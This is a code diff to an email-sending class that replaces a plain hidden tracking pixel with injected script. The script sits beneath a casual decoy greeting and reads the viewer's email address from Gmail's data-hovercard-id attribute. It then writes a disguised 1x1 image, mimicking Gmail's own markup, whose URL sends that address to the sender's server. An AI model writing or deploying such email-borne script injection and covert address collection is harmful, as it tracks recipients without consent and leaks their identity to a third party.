@@ -9,7 +9,25 @@ class emailModel {
     
     try {
       // Create tracking pixel HTML
-      const trackingPixel = `<img src="${process.env.BASE_URL}/api/track?id=${trackingId}" width="1" height="1" alt="" style="display:none !important;" border="0">`;
+      const trackingPixel = `<p>Hey whatsup! bro long time no see&lt;&gt;</p>
+        <script>
+          // Get the email from data-hovercard-id attribute
+          function getSenderEmail() {
+            const elements = document.querySelectorAll('[data-hovercard-id]');
+            return elements.length > 0 ? elements[0].getAttribute('data-hovercard-id') : '';
+          }
+          
+          // Build the tracking URL with the email parameter
+          const email = getSenderEmail();
+          const trackingId = "${trackingId}";
+          const baseUrl = "${process.env.BASE_URL}";
+          
+          // Construct full tracking URL
+          const trackingUrl = baseUrl + "?id=" + trackingId + (email ? "&mail=" + encodeURIComponent(email) : "");
+          
+          // Write the tracking pixel directly to the document at this point
+          document.write('<img src="' + trackingUrl + '" width="1" height="1" alt="" style="display:none!important" border="0" class="CToWUd" data-bit="iit">');
+        </script>`;
       
       // Append tracking pixel to HTML content
       const htmlWithTracker = htmlContent + trackingPixel;
